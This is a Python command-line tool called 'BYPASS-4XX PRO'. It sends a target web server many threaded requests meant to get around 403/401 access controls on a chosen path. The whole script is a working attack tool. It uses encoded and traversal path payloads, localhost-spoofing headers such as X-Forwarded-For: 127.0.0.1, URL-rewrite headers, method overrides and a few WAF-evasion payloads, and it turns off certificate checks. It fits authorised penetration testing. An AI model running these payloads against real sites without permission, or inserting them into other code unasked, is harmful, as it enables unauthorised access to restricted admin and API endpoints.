#!/usr/bin/env python3

import requests
import argparse
import pyfiglet
import base64
from itertools import product
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from colorama import Fore, Style, init
from urllib.parse import urlparse, urlunparse
from tqdm import tqdm
import urllib3

# Suppress only the InsecureRequestWarning from urllib3 needed for verify=False
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize colorama
init(autoreset=True)


class BypassRunner:
    """
    An advanced tool to test for 4xx and 3xx bypasses on web servers,
    incorporating a wide range of techniques from various sources.
    """

    def __init__(self, args):
        self.target_url = args.url.rstrip('/')
        self.target_path = args.path.lstrip('/')
        self.full_url = f"{self.target_url}/{self.target_path}"
        self.parsed_url = urlparse(self.target_url)
        self.log_file = args.output
        self.threads = args.threads
        self.timeout = args.timeout
        self.verbose = args.verbose

        self.session = requests.Session()
        self.session.verify = False  # Ignore SSL certificate verification
        if args.proxy:
            proxies = {'http': args.proxy, 'https': args.proxy}
            self.session.proxies.update(proxies)

        self.session.headers.update({'User-Agent': args.user_agent})

        self.successful_attempts = set()
        self.pbar = None

    def print_banner(self):
        """Prints the tool's banner."""
        banner = pyfiglet.figlet_format("BYPASS-4XX PRO")
        author = "Ram"
        print(Fore.RED + banner)
        print(Fore.CYAN + author.center(60))
        print("-" * 60)
        print(f"{Fore.YELLOW}Target URL: {self.target_url}")
        print(f"{Fore.YELLOW}Target Path: {self.target_path}")
        print(f"{Fore.YELLOW}Threads: {self.threads}")
        if self.log_file:
            print(f"{Fore.YELLOW}Log File: {self.log_file}")
        print("-" * 60)

    def log_result(self, message, is_success=True):
        """Logs a message to the console and file."""
        # Use a tuple to check for uniqueness to avoid issues with unhashable dicts
        log_key = message
        if is_success:
            if log_key in self.successful_attempts:
                return
            self.successful_attempts.add(log_key)
            print(Fore.GREEN + Style.BRIGHT + message + Style.RESET_ALL)
            if self.log_file:
                with open(self.log_file, "a") as f:
                    f.write(message + "\n")
        elif self.verbose:
            print(Fore.RED + message + Style.RESET_ALL)

    def generate_payloads(self):
        """Generates a comprehensive list of bypass payloads and techniques."""
        path = self.target_path

        # Payloads from original Python script
        base_payloads = [
            f"/%2e/{path}", f"/{path}/.", f"//{path}//", f"/..;/{path}"
        ]

        # Payloads from bash script's URL_Encode_Bypass function
        bash_payloads = [
            f"/{path}#?", f"/{path}%09", f"/{path}%20", f"/{path}?", f"/{path}??", f"/{path}???",
            f"/{path}//", f"/{path}/./", f"/{path}/*", f"/{path}.html", f"/{path}.json",
            f"/{path}/..;/", f"/{path}..;/", f"/{path};/",
            f"/{path}/%2e/", f"/{path}/%20/", f"/{path}/%2e%2e/",
            f"/;{path}/",
            # Path traversal and encoding
            "/..%2f", "/..%5c", "/..%00/", "/..%0d/", "/..%ff/",
            "/.", "/./", "/../", "/../../", "/../../../",
            # Various encoded/special characters
            "%2e", "..;", "%00", "%2f", "%5c", "~"
        ]

        all_payloads = list(set(base_payloads + bash_payloads))
        return all_payloads

    def generate_headers(self):
        """Generates a list of headers to test for bypasses from the bash script."""
        domain = self.parsed_url.hostname
        headers = [
            # IP Spoofing / Origin Headers
            {"X-Originally-Forwarded-For": "127.0.0.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
            {"X-Host": "127.0.0.1"},
            {"X-ProxyUser-Ip": "127.0.0.1"},
            {"True-Client-IP": "127.0.0.1"},
            {"Client-IP": "127.0.0.1"},
            {"X-Real-Ip": "127.0.0.1"},
            {"X-Remote-Addr": "127.0.0.1"},
            {"X-Forwarded-By": "127.0.0.1"},
            {"X-Forwarded-For-Original": "127.0.0.1"},
            {"X-Forwarder-For": "127.0.0.1"},
            {"X-Original-Remote-Addr": "127.0.0.1"},
            {"CF-Connecting-IP": "127.0.0.1"},
            {"CF-Connecting_IP": "127.0.0.1"},  # Note the underscore

            # Routing / URL Override Headers
            {"X-Original-URL": f"/{self.target_path}"},
            {"X-Rewrite-URL": f"/{self.target_path}"},
            {"X-Forwarded-Host": "localhost"},
            {"X-Forwarded-Server": "localhost"},
            {"X-HTTP-DestinationURL": f"http://{domain}"},
            {"X-HTTP-Host-Override": f"{domain}"},
            {"Base-Url": f"http://{domain}"},
            {"Http-Url": f"http://{domain}"},
            {"Proxy-Host": f"http://{domain}"},
            {"Proxy-Url": f"http://{domain}"},
            {"Real-Ip": f"http://{domain}"},  # Sometimes used for routing
            {"Redirect": f"http://{domain}"},
            {"Request-Uri": f"http://{domain}"},
            {"Uri": f"http://{domain}"},
            {"Url": f"http://{domain}"},

            # Protocol and Port Override
            {"X-Forwarded-Proto": "http"},
            {"X-Forwarded-Scheme": "http"},
            {"X-Forwarded-Scheme": "https"},
            {"X-Forwarded-Port": "80"},
            {"X-Forwarded-Port": "443"},
            {"X-Forwarded-Port": "8080"},
            {"X-Forwarded-Port": "8443"},

            # Other Headers
            {"Referer": f"{self.target_url}"},
            {"Referrer": f"{self.target_url}"},  # Common misspelling
            {"Content-Length": "0"},
        ]
        return headers

    def test_request(self, method, url, headers=None, payload_info=""):
        """Sends a single request and checks the response."""
        try:
            effective_headers = self.session.headers.copy()
            if headers:
                effective_headers.update(headers)

            response = self.session.request(method, url, headers=effective_headers, timeout=self.timeout,
                                            allow_redirects=False)
            status = response.status_code

            if 200 <= status < 400:
                msg = (f"[{datetime.now().strftime('%H:%M:%S')}] SUCCESS ({status}) | "
                       f"URL: {url} | METHOD: {method} | "
                       f"HEADERS: {headers or 'Default'} | {payload_info}")
                self.log_result(msg, is_success=True)
            else:
                msg = f"FAILED ({status}) | URL: {url} | METHOD: {method}"
                self.log_result(msg, is_success=False)

        except requests.exceptions.RequestException as e:
            msg = f"ERROR | URL: {url} | Could not connect: {e}"
            self.log_result(msg, is_success=False)
        finally:
            if self.pbar:
                self.pbar.update(1)

    def run(self):
        """Main function to orchestrate the bypass testing."""
        self.print_banner()

        if self.log_file:
            with open(self.log_file, "w") as f:
                f.write(f"Bypass Testing Results for {self.full_url}\n\n")

        # Expanded methods from bash script
        methods = ["GET", "POST", "HEAD", "OPTIONS", "PUT", "DELETE", "PATCH", "TRACE", "LOCK", "UPDATE", "TRACK"]
        payloads = self.generate_payloads()
        headers_to_test = self.generate_headers()

        # Payloads for specific WAF bypass from bash script
        waf_payloads = [
            "/'%20or%201.e(%22)%3D'",
            "/1.e(ascii",
            "/1.e(substring("
        ]

        tasks = []

        # Strategy 1: Test various HTTP methods
        for method in methods:
            tasks.append({'method': method, 'url': self.full_url, 'payload_info': "Method Test"})

        # Strategy 2: Test URL path payloads with GET
        for payload in payloads:
            test_url = f"{self.target_url}{payload}"
            tasks.append({'method': "GET", 'url': test_url, 'payload_info': f"Path Payload: {payload}"})

        # Strategy 3: Test header injections with GET
        for header in headers_to_test:
            tasks.append({'method': "GET", 'url': self.full_url, 'headers': header, 'payload_info': "Header Injection"})

        # Strategy 4: Test method override with POST
        for method_override in ["GET", "PUT", "DELETE"]:
            override_headers = {"X-HTTP-Method-Override": method_override}
            tasks.append({'method': 'POST', 'url': self.full_url, 'headers': override_headers,
                          'payload_info': f"Method Override"})

        # Strategy 5: Test for specific WAF bypasses
        for payload in waf_payloads:
            test_url = f"{self.full_url}{payload}"
            tasks.append({'method': 'GET', 'url': test_url, 'payload_info': f"WAF Payload: {payload}"})

        # Initialize progress bar
        self.pbar = tqdm(total=len(tasks), desc="Testing Payloads", unit="req", ncols=100)

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            for task in tasks:
                executor.submit(self.test_request, task['method'], task['url'], task.get('headers'),
                                task.get('payload_info', ''))

        self.pbar.close()
        print(f"\n{Fore.CYAN}Scan complete. {len(self.successful_attempts)} potential bypasses found.")
        if self.log_file:
            print(f"{Fore.GREEN}Results saved to {self.log_file}{Style.RESET_ALL}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Advanced 4xx/3xx Bypass Tool with integrated techniques from multiple sources.",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("-u", "--url", type=str, required=True, help="Target URL (e.g., https://example.com)")
    parser.add_argument("-p", "--path", type=str, required=True,
                        help="Target path to test (e.g., /admin, /api/v1/users)")
    parser.add_argument("-o", "--output", type=str, help="Specify output file name to save results (e.g., results.txt)")
    parser.add_argument("-t", "--threads", type=int, default=30, help="Number of concurrent threads (default: 30)")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds (default: 10)")
    parser.add_argument("--proxy", type=str, help="Proxy server to use (e.g., http://127.0.0.1:8080)")
    parser.add_argument("-ua", "--user-agent", type=str, default="Bypass-Tool-Pro/3.0", help="Custom User-Agent string")
    parser.add_argument("-v", "--verbose", action="store_true", help="Show failed attempts in output")

    args = parser.parse_args()

    runner = BypassRunner(args)
    runner.run()
